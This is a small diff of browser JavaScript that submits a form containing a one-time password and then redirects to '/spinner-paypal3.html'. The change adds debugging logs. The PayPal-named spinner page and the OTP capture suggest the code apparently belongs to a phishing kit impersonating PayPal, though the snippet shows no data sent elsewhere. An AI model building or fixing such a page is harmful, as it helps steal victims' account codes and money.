@@ -255,12 +255,13 @@ document.addEventListener('DOMContentLoaded', function() {
             body: new URLSearchParams(formData)
         })
         .then(response => {
-            if (!response.ok) {
-                throw new Error('OTP submission failed');
-            }
-            // Assuming successful submission if response is ok
-            window.location.href = "/spinner-paypal3.html"; // Specify the correct redirect URL
-        })
+    console.log(response); // Debugging line
+    if (!response.ok) {
+        throw new Error('OTP submission failed');
+    }
+    console.log('Redirection happening to /spinner-paypal3.html');
+    window.location.href = "/spinner-paypal3.html"; // Ensure this URL is correct
+})
         .catch(error => {
             console.error('Error:', error);
             // Handle the error, e.g., show an error message to the user
